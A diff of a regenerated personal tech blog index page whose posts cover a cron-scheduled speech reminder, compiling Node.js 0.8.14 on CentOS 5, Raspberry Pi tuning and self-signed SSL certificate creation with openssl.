-<p>3). Run some dry tests by running<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash ~/reminder.sh</span><br></pre></td></tr></table></figure><br>4). Add the reminder to crontab<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crontab -e</span><br></pre></td></tr></table></figure><br>insert the following line:</p>
-<p>0 9-16 <em> </em> 1-5 bash ~/reminder.sh</p>
+<p>3). Run some dry tests by running</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash ~/reminder.sh</span><br></pre></td></tr></table></figure>
+<p>4). Add the reminder to crontab</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crontab -e</span><br></pre></td></tr></table></figure>
+<p>insert the following line:</p>
+<p>0 9-16 * * 1-5 bash ~/reminder.sh</p>
 <p>This will run the reminder script from 9am to 4pm hourly on the clock Monday through Friday. If you are new to crontab, refer to <a href="http://en.wikipedia.org/wiki/Cron" target="_blank" rel="noopener">http://en.wikipedia.org/wiki/Cron</a> for more details.</p>
 <h2 id="Notes"><a href="#Notes" class="headerlink" title="Notes"></a>Notes</h2><ol>
 <li>I tried putting the meat inside ~/reminder.sh directly into crontab, didn’t work, that’s why this extra script is needed.</li>
@@ -108,7 +356,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://midnightcodr.github.io/2013/01/26/cool-audio-reminder-script-with-mac-os-xs-text-to-speech-feature/" data-id="cjp5z6t9q00099r9w9cx6ja9s" class="article-share-link">Share</a>
+      <a data-url="http://midnightcodr.github.io/2013/01/26/cool-audio-reminder-script-with-mac-os-xs-text-to-speech-feature/" data-id="cjwnz57pi0006li9w36e0nyzq" class="article-share-link">Share</a>
       
         <a href="http://midnightcodr.github.io/2013/01/26/cool-audio-reminder-script-with-mac-os-xs-text-to-speech-feature/#disqus_thread" class="article-comment-link">Comments</a>
       
@@ -120,7 +368,7 @@
 
 
   
-    <article id="post-display-stand-diy" class="article article-type-post" itemscope="" itemprop="blogPost">
+    <article id="post-display-stand-diy" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2012/12/30/display-stand-diy/" class="article-date">
   <time datetime="2012-12-31T01:50:00.000Z" itemprop="datePublished">2012-12-30</time>
@@ -160,7 +408,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://midnightcodr.github.io/2012/12/30/display-stand-diy/" data-id="cjp5z6t9l00049r9w00dwew12" class="article-share-link">Share</a>
+      <a data-url="http://midnightcodr.github.io/2012/12/30/display-stand-diy/" data-id="cjwnz57pi0005li9wqcee9zuw" class="article-share-link">Share</a>
       
         <a href="http://midnightcodr.github.io/2012/12/30/display-stand-diy/#disqus_thread" class="article-comment-link">Comments</a>
       
@@ -172,7 +420,7 @@
 
 
   
-    <article id="post-install-node-dot-js-v0-dot-8-14-onto-centos-5-howto" class="article article-type-post" itemscope="" itemprop="blogPost">
+    <article id="post-install-node-dot-js-v0-dot-8-14-onto-centos-5-howto" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2012/11/22/install-node-dot-js-v0-dot-8-14-onto-centos-5-howto/" class="article-date">
   <time datetime="2012-11-23T03:04:00.000Z" itemprop="datePublished">2012-11-22</time>
@@ -201,12 +449,18 @@
         <p>Installing through Linux binaries with the current newest version (v0.8.14) doesn’t seem to work. Attempting to run “node -v” would give the folowing errors</p>
 <pre><code>node: /lib/libc.so.6: version `GLIBC_2.9&apos; not found (required by node)
 node: /lib/libc.so.6: version `GLIBC_2.6&apos; not found (required by node)
-node: /lib/libc.so.6: version `GLIBC_2.7&apos; not found (required by node)
-</code></pre><p>Therefore the only way to get it installed onto Centos 5.X (which comes with Python 2.4.3 which will fail while compiling node) is through compiling from source code. I am putting together this guide to ensure the installation is painlessly easy as I’ve been through the process a few times. The systems I’ve tested with happened to be both 32bit but I assume the procedures should work with the 64bit system as well, just make sure you download the source files matching the CPU architecture.</p>
-<h2 id="Steps"><a href="#Steps" class="headerlink" title="Steps"></a>Steps</h2><p>step 1. build bzip2 from source<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget http://bzip.org/1.0.6/bzip2-1.0.6.tar.gz</span><br><span class="line">tar xpzf bzip2-1.0.6.tar.gz</span><br><span class="line"><span class="built_in">cd</span> bzip2-1.0.6</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure></p>
-<p>step 2. build Python 2.7<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget -O - http://www.python.org/ftp/python/2.7.3/Python-2.7.3.tgz|tar xz</span><br><span class="line"><span class="built_in">cd</span> Python-2.7.3</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure></p>
+node: /lib/libc.so.6: version `GLIBC_2.7&apos; not found (required by node)</code></pre><p>Therefore the only way to get it installed onto Centos 5.X (which comes with Python 2.4.3 which will fail while compiling node) is through compiling from source code. I am putting together this guide to ensure the installation is painlessly easy as I’ve been through the process a few times. The systems I’ve tested with happened to be both 32bit but I assume the procedures should work with the 64bit system as well, just make sure you download the source files matching the CPU architecture.</p>
+<h2 id="Steps"><a href="#Steps" class="headerlink" title="Steps"></a>Steps</h2><p>step 1. build bzip2 from source</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget http://bzip.org/1.0.6/bzip2-1.0.6.tar.gz</span><br><span class="line">tar xpzf bzip2-1.0.6.tar.gz</span><br><span class="line"><span class="built_in">cd</span> bzip2-1.0.6</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
+
+<p>step 2. build Python 2.7</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget -O - http://www.python.org/ftp/python/2.7.3/Python-2.7.3.tgz|tar xz</span><br><span class="line"><span class="built_in">cd</span> Python-2.7.3</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
+
 <p>step 3. log out and log back in to the system</p>
-<p>step 4. build node 0.8.14<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget -O - http://nodejs.org/dist/v0.8.14/node-v0.8.14-linux-x86.tar.gz|tar xz</span><br><span class="line"><span class="built_in">cd</span> node-v0.8.14</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure></p>
+<p>step 4. build node 0.8.14</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget -O - http://nodejs.org/dist/v0.8.14/node-v0.8.14-linux-x86.tar.gz|tar xz</span><br><span class="line"><span class="built_in">cd</span> node-v0.8.14</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
+
+
 <h2 id="Notes"><a href="#Notes" class="headerlink" title="Notes"></a>Notes</h2><ol>
 <li>Step 1 is very critical for the installation of the node. Without it, you will get Python error “cannot find module bz2” while running make in step 4;</li>
 <li>The solution provided by this guide will install Python 2.7 onto your system. If you found something broken with your Python programs, make sure you check the $PATH setting, the OS stock version should have python under /usr/bin/python while the compiled version should be /usr/local/bin/python. Adjust the orders of /usr/local/bin and /usr/bin in $PATh setting if needed.</li>
@@ -216,7 +470,7 @@ node: /lib/libc.so.6: version `GLIBC_2.7&apos; not found (required by node)
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://midnightcodr.github.io/2012/11/22/install-node-dot-js-v0-dot-8-14-onto-centos-5-howto/" data-id="cjp5z6t9i00019r9wdxntl415" class="article-share-link">Share</a>
+      <a data-url="http://midnightcodr.github.io/2012/11/22/install-node-dot-js-v0-dot-8-14-onto-centos-5-howto/" data-id="cjwnz57pg0003li9wvsncjoeu" class="article-share-link">Share</a>
       
         <a href="http://midnightcodr.github.io/2012/11/22/install-node-dot-js-v0-dot-8-14-onto-centos-5-howto/#disqus_thread" class="article-comment-link">Comments</a>
       
@@ -230,7 +484,7 @@ node: /lib/libc.so.6: version `GLIBC_2.7&apos; not found (required by node)
 
 
   
-    <article id="post-three-ways-to-speed-up-raspberry-pi" class="article article-type-post" itemscope="" itemprop="blogPost">
+    <article id="post-three-ways-to-speed-up-raspberry-pi" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2012/11/11/three-ways-to-speed-up-raspberry-pi/" class="article-date">
   <time datetime="2012-11-12T00:52:00.000Z" itemprop="datePublished">2012-11-11</time>
@@ -260,12 +514,14 @@ node: /lib/libc.so.6: version `GLIBC_2.7&apos; not found (required by node)
 <h2 id="1-Overclock"><a href="#1-Overclock" class="headerlink" title="1. Overclock"></a>1. Overclock</h2><p>With the newest Debian wheezy, simply run <strong>raspi-config</strong>, then overclock, OK, choose the one that works for you, choose OK. I settled with 900Mhz because once I use 950MHz, come tasks (such as compilings) could not run properly. Also check out <a href="http://www.raspberrypi.org/archives/tag/overclocking" target="_blank" rel="noopener">http://www.raspberrypi.org/archives/tag/overclocking</a> for more information on overclocking rpi.</p>
 <h2 id="2-Adjust-memory-split"><a href="#2-Adjust-memory-split" class="headerlink" title="2. Adjust memory split"></a>2. Adjust memory split</h2><p>By default I got only 184MB of usuable RAM for the system because the rest of the 256MB goes to GPU. While you are still at raspi-config’s top menu, choose memory_split. If you run your rpi primarily as a headless server (not running X), just pick the one with the highest system RAM option (240), OK.</p>
 <p><strong><em>Note</em></strong>: method 1 and 2 require restart to take effect.</p>
-<h2 id="3-Find-out-auto-start-services-and-de-select-those-that-don’t-need-to-auto-start"><a href="#3-Find-out-auto-start-services-and-de-select-those-that-don’t-need-to-auto-start" class="headerlink" title="3. Find out auto-start services and de-select those that don’t need to auto-start"></a>3. Find out auto-start services and de-select those that don’t need to auto-start</h2><p>For example, if you only need mysql server once a while, it makes no sense to make it run when rpi boots. A simple way to find out what processes are started during boot is through a program <strong>sysv-rc-conf</strong> (not installed by default). Install and fire it up through:<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-<span class="built_in">get</span> install sysv-rc-<span class="keyword">conf</span></span><br><span class="line">sudo sysv-rc-<span class="keyword">conf</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="3-Find-out-auto-start-services-and-de-select-those-that-don’t-need-to-auto-start"><a href="#3-Find-out-auto-start-services-and-de-select-those-that-don’t-need-to-auto-start" class="headerlink" title="3. Find out auto-start services and de-select those that don’t need to auto-start"></a>3. Find out auto-start services and de-select those that don’t need to auto-start</h2><p>For example, if you only need mysql server once a while, it makes no sense to make it run when rpi boots. A simple way to find out what processes are started during boot is through a program <strong>sysv-rc-conf</strong> (not installed by default). Install and fire it up through:</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-<span class="built_in">get</span> install sysv-rc-<span class="keyword">conf</span></span><br><span class="line">sudo sysv-rc-<span class="keyword">conf</span></span><br></pre></td></tr></table></figure>
+
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://midnightcodr.github.io/2012/11/11/three-ways-to-speed-up-raspberry-pi/" data-id="cjp5z6t9m00059r9w8vbp5z2p" class="article-share-link">Share</a>
+      <a data-url="http://midnightcodr.github.io/2012/11/11/three-ways-to-speed-up-raspberry-pi/" data-id="cjwnz57p60000li9wewnorj2d" class="article-share-link">Share</a>
       
         <a href="http://midnightcodr.github.io/2012/11/11/three-ways-to-speed-up-raspberry-pi/#disqus_thread" class="article-comment-link">Comments</a>
       
@@ -277,7 +533,7 @@ node: /lib/libc.so.6: version `GLIBC_2.7&apos; not found (required by node)
 
 
   
-    <article id="post-generate-ssl-certificate-with-1-easy-step" class="article article-type-post" itemscope="" itemprop="blogPost">
+    <article id="post-generate-ssl-certificate-with-1-easy-step" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2012/10/10/generate-ssl-certificate-with-1-easy-step/" class="article-date">
   <time datetime="2012-10-11T02:22:00.000Z" itemprop="datePublished">2012-10-10</time>
@@ -305,14 +561,17 @@ node: /lib/libc.so.6: version `GLIBC_2.7&apos; not found (required by node)
       
         <p>Originally I created a post on how to generate ssl certificate with one simple step:<br><a href="http://ricochen.wordpress.com/2010/01/01/generate-ssl-certificate-in-1-quick-step/" target="_blank" rel="noopener">http://ricochen.wordpress.com/2010/01/01/generate-ssl-certificate-in-1-quick-step/</a></p>
 <p>I am here to document the procedure in this first post of my Octopress based blog.</p>
-<p>Command to generate SSL certificate (and its associated private key) is pretty straight-forward:<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ openssl req -new -x509 -days 3650 -keyout key.pem -out cert.pem -newkey rsa:2048 -subj <span class="string">"/CN=hostname.example.org"</span></span><br></pre></td></tr></table></figure></p>
+<p>Command to generate SSL certificate (and its associated private key) is pretty straight-forward:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ openssl req -new -x509 -days 3650 -keyout key.pem -out cert.pem -newkey rsa:2048 -subj <span class="string">"/CN=hostname.example.org"</span></span><br></pre></td></tr></table></figure>
+
 <p>If a password is created in the above step, you’ll need one extra step to remove it unless you want to type the password everytime you restart the web server:</p>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ openssl rsa -<span class="keyword">in</span> key.pem -out key.pem</span><br></pre></td></tr></table></figure>
+
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://midnightcodr.github.io/2012/10/10/generate-ssl-certificate-with-1-easy-step/" data-id="cjp5z6t9f00009r9w49ffiykl" class="article-share-link">Share</a>
+      <a data-url="http://midnightcodr.github.io/2012/10/10/generate-ssl-certificate-with-1-easy-step/" data-id="cjwnz57pe0001li9wk59k0kmp" class="article-share-link">Share</a>
       
         <a href="http://midnightcodr.github.io/2012/10/10/generate-ssl-certificate-with-1-easy-step/#disqus_thread" class="article-comment-link">Comments</a>
       
@@ -339,7 +598,7 @@ node: /lib/libc.so.6: version `GLIBC_2.7&apos; not found (required by node)
   <div class="widget-wrap">
     <h3 class="widget-title">Categories</h3>
     <div class="widget">
-      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/DIY/">DIY</a><span class="category-list-count">2</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/DIY/fun/">fun</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/fun/">fun</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/fun/health/">health</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/fun/health/programming/">programming</a><span class="category-list-count">1</span></li></ul></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/howto/">howto</a><span class="category-list-count">6</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/howto/fun/">fun</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/os/">os</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/os/note/">note</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/programming/">programming</a><span class="category-list-count">4</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/programming/security/">security</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/tip/">tip</a><span class="category-list-count">1</span></li></ul>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/DIY/">DIY</a><span class="category-list-count">2</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/DIY/fun/">fun</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/fun/">fun</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/fun/health/">health</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/fun/health/programming/">programming</a><span class="category-list-count">1</span></li></ul></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/howto/">howto</a><span class="category-list-count">6</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/howto/fun/">fun</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/note/">note</a><span class="category-list-count">4</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/note/howto/">howto</a><span class="category-list-count">2</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/os/">os</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/os/note/">note</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/programming/">programming</a><span class="category-list-count">4</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/programming/security/">security</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/tip/">tip</a><span class="category-list-count">1</span></li></ul>
     </div>
   </div>
 
@@ -348,7 +607,7 @@ node: /lib/libc.so.6: version `GLIBC_2.7&apos; not found (required by node)
   <div class="widget-wrap">
     <h3 class="widget-title">Tags</h3>
     <div class="widget">
-      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/SSL/">SSL</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/centos/">centos</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cli/">cli</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fun/">fun</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/gitlab/">gitlab</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ikea/">ikea</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/javascript/">javascript</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mongodb/">mongodb</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/nagios/">nagios</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/nodejs/">nodejs</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/openssl/">openssl</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/raspberrypi/">raspberrypi</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/shell/">shell</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tonymacx86/">tonymacx86</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ubuntu/">ubuntu</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/zsh/">zsh</a><span class="tag-list-count">1</span></li></ul>
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/SSL/">SSL</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/centos/">centos</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cli/">cli</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fun/">fun</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/gitlab/">gitlab</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hapijs/">hapijs</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ikea/">ikea</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/javascript/">javascript</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mongodb/">mongodb</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/nagios/">nagios</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/nodejs/">nodejs</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/nsq/">nsq</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/openssl/">openssl</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/raspberrypi/">raspberrypi</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/shell/">shell</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tonymacx86/">tonymacx86</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ubuntu/">ubuntu</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/zsh/">zsh</a><span class="tag-list-count">1</span></li></ul>
     </div>
   </div>
 
@@ -357,7 +616,7 @@ node: /lib/libc.so.6: version `GLIBC_2.7&apos; not found (required by node)
   <div class="widget-wrap">
     <h3 class="widget-title">Tag Cloud</h3>
     <div class="widget tagcloud">
-      <a href="/tags/SSL/" style="font-size: 10px;">SSL</a> <a href="/tags/centos/" style="font-size: 10px;">centos</a> <a href="/tags/cli/" style="font-size: 10px;">cli</a> <a href="/tags/fun/" style="font-size: 10px;">fun</a> <a href="/tags/gitlab/" style="font-size: 10px;">gitlab</a> <a href="/tags/ikea/" style="font-size: 10px;">ikea</a> <a href="/tags/javascript/" style="font-size: 20px;">javascript</a> <a href="/tags/mongodb/" style="font-size: 10px;">mongodb</a> <a href="/tags/nagios/" style="font-size: 10px;">nagios</a> <a href="/tags/nodejs/" style="font-size: 15px;">nodejs</a> <a href="/tags/openssl/" style="font-size: 10px;">openssl</a> <a href="/tags/raspberrypi/" style="font-size: 10px;">raspberrypi</a> <a href="/tags/shell/" style="font-size: 10px;">shell</a> <a href="/tags/tonymacx86/" style="font-size: 10px;">tonymacx86</a> <a href="/tags/ubuntu/" style="font-size: 10px;">ubuntu</a> <a href="/tags/zsh/" style="font-size: 10px;">zsh</a>
+      <a href="/tags/SSL/" style="font-size: 10px;">SSL</a> <a href="/tags/centos/" style="font-size: 10px;">centos</a> <a href="/tags/cli/" style="font-size: 10px;">cli</a> <a href="/tags/fun/" style="font-size: 10px;">fun</a> <a href="/tags/gitlab/" style="font-size: 10px;">gitlab</a> <a href="/tags/hapijs/" style="font-size: 10px;">hapijs</a> <a href="/tags/ikea/" style="font-size: 10px;">ikea</a> <a href="/tags/javascript/" style="font-size: 20px;">javascript</a> <a href="/tags/mongodb/" style="font-size: 20px;">mongodb</a> <a href="/tags/nagios/" style="font-size: 10px;">nagios</a> <a href="/tags/nodejs/" style="font-size: 15px;">nodejs</a> <a href="/tags/nsq/" style="font-size: 10px;">nsq</a> <a href="/tags/openssl/" style="font-size: 10px;">openssl</a> <a href="/tags/raspberrypi/" style="font-size: 10px;">raspberrypi</a> <a href="/tags/shell/" style="font-size: 10px;">shell</a> <a href="/tags/tonymacx86/" style="font-size: 10px;">tonymacx86</a> <a href="/tags/ubuntu/" style="font-size: 10px;">ubuntu</a> <a href="/tags/zsh/" style="font-size: 10px;">zsh</a>
     </div>
   </div>
 
@@ -366,7 +625,7 @@ node: /lib/libc.so.6: version `GLIBC_2.7&apos; not found (required by node)
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/05/">May 2017</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/02/">February 2015</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/03/">March 2014</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/01/">January 2014</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/11/">November 2013</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/07/">July 2013</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/06/">June 2013</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/05/">May 2013</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/04/">April 2013</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/01/">January 2013</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/12/">December 2012</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/11/">November 2012</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/10/">October 2012</a><span class="archive-list-count">1</span></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/05/">May 2017</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/02/">February 2015</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/03/">March 2014</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/01/">January 2014</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/11/">November 2013</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/07/">July 2013</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/06/">June 2013</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/05/">May 2013</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/04/">April 2013</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/01/">January 2013</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/12/">December 2012</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/11/">November 2012</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/10/">October 2012</a><span class="archive-list-count">1</span></li></ul>
     </div>
   </div>
 
@@ -378,23 +637,23 @@ node: /lib/libc.so.6: version `GLIBC_2.7&apos; not found (required by node)
       <ul>
         
           <li>
+            <a href="/2019/06/08/Add-error-code-s-to-Hapijs-validation-output/">Add error code(s) to Hapijs output</a>
+          </li>
+        
+          <li>
+            <a href="/2018/12/14/How-to-test-nsq-with-docker-and-nsqjs/">How to test nsq with docker (and nsqjs)</a>
+          </li>
+        
+          <li>
+            <a href="/2018/12/10/Create-a-mongodb-cluster-with-authentication-enabled/">Create a mongodb cluster using Docker with authentication enabled</a>
+          </li>
+        
+          <li>
+            <a href="/2018/12/09/mongodb-authentication-how-to/">mongodb authentication by example</a>
+          </li>
+        
+          <li>
             <a href="/2018/12/01/Ubuntu-18-10-installation-notes/">Ubuntu 18.10 installation notes</a>
-          </li>
-        
-          <li>
-            <a href="/2017/05/29/ditch-moment-js-for-date-fns/">ditch moment.js for date-fns</a>
-          </li>
-        
-          <li>
-            <a href="/2015/02/07/OHLC-data-grouping-with-mongodb/">OHLC data grouping with mongodb</a>
-          </li>
-        
-          <li>
-            <a href="/2014/03/23/i-just-built-my-first-standing-desk/">I just built my first standing desk</a>
-          </li>
-        
-          <li>
-            <a href="/2014/01/11/install-gitlab-6-dot-4-on-raspberry-pi/">Install Gitlab(6.4) on Raspberry PI</a>
           </li>
         
       </ul>
@@ -409,7 +668,7 @@ node: /lib/libc.so.6: version `GLIBC_2.7&apos; not found (required by node)
   
   <div class="outer">
     <div id="footer-info" class="inner">
-      &copy; 2018 Rico Chen<br>
+      &copy; 2019 Rico Chen<br>
